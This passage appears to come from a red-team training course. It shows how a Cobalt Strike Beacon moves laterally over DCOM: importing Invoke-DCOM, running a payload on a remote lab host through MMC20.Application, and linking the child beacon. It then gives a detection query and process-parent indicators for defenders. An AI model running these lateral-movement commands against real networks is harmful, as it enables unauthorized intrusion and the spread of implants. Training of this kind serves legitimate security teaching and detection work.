Beacon has no built-in capabilities to interact over Distributed Component Object Model (DCOM), so we must use an external tool such as [Invoke-DCOM](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1). Â We'll see in a later module how this can be integrated into the `jump` command.
```
beacon> powershell-import C:\Tools\Invoke-DCOM.ps1
beacon> powershell Invoke-DCOM -ComputerName web.dev.cyberbotic.io -Method MMC20.Application -Command C:\Windows\smb_x64.exe
Completed

beacon> link web.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
[+] established link to child beacon: 10.10.122.30
```
  

DCOM is more complicated to detect, since each "Method" works in a different way. In the particular case of `MMC20.Application`, the spawned process will be a child of `mmc.exe`.
```
event.category: process and event.type : start and process.parent.name: mmc.exe
```

Processes started via DCOM may also be observed where the parent is `svchost.exe` with command line arguments of `-k DcomLaunch`.
